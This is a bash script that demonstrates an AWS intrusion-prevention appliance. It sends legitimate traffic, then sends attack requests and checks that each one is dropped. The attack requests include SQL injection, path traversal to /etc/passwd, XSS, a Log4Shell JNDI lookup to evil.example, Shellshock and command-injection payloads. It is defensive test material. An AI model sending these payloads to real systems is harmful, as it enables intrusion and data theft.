#!/usr/bin/env bash
# Demo of the two acceptance cases. Requires AWS credentials in the environment,
# `terraform apply` already done, and curl/jq/aws on the PATH.
set -uo pipefail
cd "$(dirname "$0")/.."

IP=$(terraform output -raw app_public_ip)
TG=$(terraform output -raw target_group_arn)
APP=$(terraform output -raw app_instance_id)
APPLIANCES=$(terraform output -json appliance_instance_ids | jq -r '.[]')
MYIP=$(curl -s -m 5 https://checkip.amazonaws.com | tr -d '\n')

hr() { printf '\n%s\n%s\n' "================================================================" "$*"; }

ssm() { # ssm "<instance ids>" "<shell command>"
  local cid
  cid=$(aws ssm send-command --instance-ids $1 --document-name AWS-RunShellScript \
        --parameters "commands=[\"$2\"]" --query Command.CommandId --output text)
  sleep 5
  for i in $1; do
    for _ in $(seq 1 10); do
      st=$(aws ssm get-command-invocation --command-id "$cid" --instance-id "$i" --query Status --output text 2>/dev/null)
      [ "$st" = "InProgress" -o "$st" = "Pending" ] && sleep 2 || break
    done
    echo "--- $i"
    aws ssm get-command-invocation --command-id "$cid" --instance-id "$i" --query StandardOutputContent --output text
  done
}

hr "PRE-FLIGHT"
echo "Client (attacker/legit user) public IP : $MYIP"
echo "Protected app (EIP)                    : $IP"
echo "GWLB target health:"
aws elbv2 describe-target-health --target-group-arn "$TG" \
  --query 'TargetHealthDescriptions[].[Target.Id,TargetHealth.State]' --output text

hr "CASE 1 - LEGITIMATE TRAFFIC (expect HTTP 200, inspected + allowed)"
for req in "GET /" "GET /products?id=42" "GET /about"; do
  path=${req#GET }
  printf '%-26s -> ' "curl $path"
  curl -s -m 8 -w ' [HTTP %{http_code}]\n' "http://$IP$path"
done
printf '%-26s -> ' "curl POST /api (json)"
curl -s -m 8 -X POST -H 'Content-Type: application/json' -d '{"name":"alice"}' -w ' [HTTP %{http_code}]\n' "http://$IP/api"

hr "CASE 1 EVIDENCE - appliances: HTTP requests inspected & ALLOWED (eve.json)"
ssm "$(echo $APPLIANCES)" "grep '\\\"event_type\\\": \\\"http\\\"' /var/log/gwlb-ips/eve.json | tail -6 | cut -c1-260"

hr "CASE 1 EVIDENCE - application received the requests with the real client IP (transparent inspection)"
ssm "$APP" "tail -6 /var/log/app/access.log"

hr "CASE 2 - MALICIOUS TRAFFIC (expect timeout / no response: packet dropped by the appliance)"
attack() { # name, curl args...
  local name=$1; shift
  printf '%-34s -> ' "$name"
  out=$(curl -s -g --path-as-is -m 6 -o /dev/null -w '%{http_code}' "$@" 2>/dev/null); rc=$?
  if [ "$rc" = 28 ] || [ "$out" = 000 ]; then echo "BLOCKED (no response, curl rc=$rc, timeout after 6s)"; else echo "!! NOT BLOCKED (HTTP $out)"; fi
}
attack "SQLi  ' OR '1'='1"            "http://$IP/?id=1'%20OR%20'1'='1"
attack "SQLi  UNION SELECT"           "http://$IP/?id=1%20UNION%20SELECT%20username,password%20FROM%20users"
attack "Path traversal /etc/passwd"   "http://$IP/../../../../etc/passwd"
attack "XSS   <script>"               "http://$IP/?q=<script>alert(1)</script>"
attack "Log4Shell \${jndi:ldap://}"   -H 'X-Api-Version: ${jndi:ldap://evil.example/a}' "http://$IP/"
attack "Scanner UA (sqlmap)"          -A 'sqlmap/1.7.2#stable (https://sqlmap.org)' "http://$IP/"
attack "Shellshock"                   -A '() { :; }; /bin/cat /etc/passwd' "http://$IP/"
attack "Command injection ;cat"       "http://$IP/?cmd=ls;cat%20/etc/passwd"

hr "CASE 2 CHECK - application still healthy for a legitimate NEW connection after the attacks"
printf 'curl /  -> '; curl -s -m 8 -w ' [HTTP %{http_code}]\n' "http://$IP/"

hr "CASE 2 EVIDENCE - appliances: ALERTS with action=blocked (eve.json)"
ssm "$(echo $APPLIANCES)" "grep '\\\"event_type\\\": \\\"alert\\\"' /var/log/gwlb-ips/eve.json | python3 -c 'import sys,json
for l in sys.stdin:
    e=json.loads(l); print(e[\\\"timestamp\\\"], e[\\\"action\\\"].upper(), \\\"sid=%s\\\"%e[\\\"signature_id\\\"], e[\\\"src_ip\\\"], \\\"->\\\", e[\\\"dest_ip\\\"]+\\\":\\\"+str(e[\\\"dest_port\\\"]), \\\"|\\\", e[\\\"signature\\\"], \\\"|\\\", e[\\\"http_request\\\"][:70])'"

hr "CASE 2 EVIDENCE - appliance counters (/stats)"
ssm "$(echo $APPLIANCES)" "curl -s localhost:8080/stats | python3 -c 'import sys,json; d=json.load(sys.stdin); print({k:d[k] for k in (\\\"packets\\\",\\\"forwarded\\\",\\\"dropped\\\",\\\"alerts\\\",\\\"http_requests_allowed\\\")})'"

hr "CASE 2 EVIDENCE - application access log: NONE of the malicious requests arrived"
ssm "$APP" "cat /var/log/app/access.log; echo; echo 'lines matching attack patterns:'; grep -ciE 'union|passwd|script|jndi|sqlmap|OR%20|cat' /var/log/app/access.log || true"
